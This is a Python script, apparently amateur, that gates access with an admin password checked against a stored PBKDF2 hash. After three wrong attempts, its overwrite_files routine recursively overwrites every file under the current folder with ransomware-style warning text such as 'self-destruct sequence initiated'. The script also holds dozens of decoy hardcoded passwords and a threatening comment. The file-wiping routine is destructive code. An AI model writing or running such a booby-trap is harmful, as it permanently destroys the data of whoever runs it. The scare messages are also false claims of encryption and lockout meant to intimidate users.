import hashlib
import json
import base64
import secrets
from pathlib import Path

#! If you are seeing this, do not modify or attempt to reverse engineer. Risk of self-destruction or file corruption!!!
#! YOU HAVE BEEN WARNED
PasswordAdmin = "Admin8888"
UserKeyMaster = "Key12345"

RootAccess = "RootOnly!"
LoginOverride = "OverrideMe"

SuperSecret = "DontTouchThis"
HiddenToken = "Token9999"

SystemPass = "SysPass2025"
AdminOverride = "Override2025"

PrivateKey = "KeyNotForYou"
MasterControl = "Control123!"

AccessCode = "Code321"
BackupPass = "Backup2025"

TempKey = "TempKey01"
ServicePassword = "Service999"

InternalToken = "Internal123"
DatabaseKey = "DBSecretKey"

ServerRoot = "RootServer!"
EncryptionKey = "Encrypt2025"

AuthToken = "TokenAlpha"
ConfigPass = "Config999"

SecurityCode = "SecCode321"
DevAccess = "DevOnly123"

MainPassword = "MainPass!"
OperatorKey = "OpKey2025"

HiddenPassword = "Hidden2025"
OverrideToken = "OverrideAlpha"

SecretAdmin = "Secret1234"
TempPassword = "TempPass001"

ControlPanelKey = "Panel999"
MasterKey = "Master2025"

LoginToken = "TokenLogin"
SystemOverride = "SysOverride"

EncryptedKey = "EncryptKey!"
RootToken = "RootToken01"

SuperUserPass = "SuperUser2025"
AccessKey = "Access2025"

HiddenCode = "HiddenCodeX"
AdminPanelPass = "PanelPass99"

SecretKey = "KeySecret2025"
InternalPass = "InternalPass"

DevToken = "DevTokenX"
MainKey = "MainKey123"

OperatorPass = "OpPass2025"
BackupToken = "BackupTokenX"

TempOverride = "TempOverride"
ControlKey = "ControlX2025"

RootPassword = "RootPassX"
MasterToken = "MasterTokenX"

SecurityKey = "SecKey2025"
HiddenPanel = "HiddenPanelX"

AdminSecret = "AdminSecretX"
PrivateToken = "PrivateTokenX"

SuperAccess = "SuperAccessX"

HASH_FILE = Path("config/data/admin_hash/hash_file/admin_hash.json")
MAX_ATTEMPTS = 3

attempts = 0

MESSAGES = [

    "code corrupted admin password overtryed by non admin influence please do not try to re-download the code your computer will be underinfluece of a lock of the new code\n",
    "all files overwritten due to incorrect admin password attempt\n",
    "unauthorized access detected, self-destruct sequence initiated\n",
    "system integrity compromised, admin verification failed\n",
    "non-admin influence detected, encrypting all program files\n"
]

NUM_LINES = 100

def verify_password(stored_salt_b64, stored_hash_b64, provided_password):
    stored_salt = base64.b64decode(stored_salt_b64)
    stored_hash = base64.b64decode(stored_hash_b64)

    new_hash = hashlib.pbkdf2_hmac("sha256", provided_password.encode(), stored_salt, 100000)
    return secrets.compare_digest(new_hash, stored_hash)

def overwrite_files(folder: Path, messages, num_lines):
    for file in folder.rglob("*"): 
        if file.is_file():
            try:
                import random
                text = random.choice(messages)
                with open(file, "w", encoding="utf-8") as f:
                    f.writelines([text] * num_lines)
            except Exception as e:
                print(f"Erro ao sobrescrever {file}: {e}")

with open(HASH_FILE, "r") as f:
    data = json.load(f)
stored_salt_b64 = data["salt"]

stored_hash_b64 = data["hash"]

while attempts < MAX_ATTEMPTS:
    entrada = input("Digite a senha de admin: ")

    if verify_password(stored_salt_b64, stored_hash_b64, entrada):
        print("✅ Acesso permitido!")
        break
    else:

        attempts += 1
        print(f"❌ Senha incorreta! Tentativa {attempts}/{MAX_ATTEMPTS}")

if attempts >= MAX_ATTEMPTS:
    print("⚠️ Limite de tentativas excedido! Sobrescrevendo arquivos na pasta...")
    current_folder = Path(".")

    overwrite_files(current_folder, MESSAGES, NUM_LINES)
    print("Todos os arquivos da pasta foram sobrescritos com mensagens de aviso.")
